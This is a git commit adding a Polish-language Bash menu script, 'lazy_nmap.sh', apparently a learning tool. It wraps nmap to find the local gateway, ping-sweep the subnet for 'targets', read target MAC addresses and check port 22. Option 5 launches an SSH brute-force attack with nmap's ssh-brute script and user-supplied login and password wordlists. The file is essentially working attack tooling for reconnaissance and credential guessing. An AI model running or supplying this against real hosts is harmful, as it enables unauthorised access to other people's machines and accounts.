2ac338fe6d97a4ed4d54b4417fe17d7083e025c5
Przemysław Szmaj <37410338+PSZMAJ@users.noreply.github.com>
2022-05-05 22:52:08 +0200

    Ver 1.0
    ver 1.0

---
+++ lazy_nmap.sh
@@ -0,0 +1,79 @@
+#!/bin/bash
+
+
+IP_brama="$(ip route | grep via | awk '{print$3}')"
+
+#1
+pokaz_ip_bramy()
+{
+	echo -e "\e[35m IP Twojej bramy to: \e[0m" $IP_brama && ./nauka.sh 
+}
+#2
+pokaz_dostepne_cele()
+{	
+
+	echo -e "\e[35m Dostepne cele w Twojej sieci to: \e[0m"
+	sudo nmap -sP $IP_brama/24 | grep '(1' | awk '{print$5$6}'  && ./nauka.sh  
+}
+#3
+pokaz_adres_MAC()
+{	
+	echo -e "\e[35m Podaj IP celu \e[0m"
+	read cel
+	echo -e "\e[35m Adres MAC celu to: \e[0m"
+	sudo nmap -sP -P $cel |grep MAC | awk '{print$3}' && ./nauka.sh  
+  
+}
+#4
+Pokaz_Port_ssh()
+{
+	echo -e "\e[35m Podaj IP celu \e[0m"
+	read cel
+	sudo nmap -p22 $cel  | grep 22/tcp  && ./nauka.sh
+}
+
+#5
+SSH_Brute()
+{
+	echo -e "\e[35m Podaj IP celu \e[0m"
+	read cel
+	echo -e "\e[35m Podaj sciezke do slownika z loginami \e[0m" 
+	read login
+	echo -e "\e[35m Podaj sciezke do slownika z haslami \e[0m" 
+	read haslo
+	sudo nmap --script ssh-brute -p22 $cel --script-args userdb=$login,passdb=$haslo
+	sudo ./nauka.sh
+		
+	
+}
+
+
+
+
+echo -e "\e[31m [---------L-A-Z-Y--N-M-A-P------BY-PRZEMO---V.1-0-----------------------------]\e[0m"
+echo -e "\e[31m [1] - Pokaz IP Bramy w Twojej sieci \e[0m"
+echo -e "\e[31m [2] - Pokaz dostepne cele - skanowanie pingiem \e[0m"
+echo -e "\e[31m [3] - Pokaz adres MAC celu- skanowanie pingiem \e[0m"
+echo -e "\e[31m [4] - Pokaz stan portu SSH \e[0m"
+echo -e "\e[31m [5] - Wykonaj atak BruteForce SSH \e[0m"
+echo -e "\e[31m [----------------------------------------------------------------------------] \e[0m"
+
+
+read opcja
+case "$opcja" in
+
+
+  "1") pokaz_ip_bramy ;;
+  "2") pokaz_dostepne_cele ;;
+  "3") pokaz_adres_MAC ;;
+  "4") Pokaz_Port_ssh ;;
+  "5") SSH_Brute;;
+
+
+  "11") exit ;;
+  *)  ./nauka.sh
+  
+esac
+
+ 
+
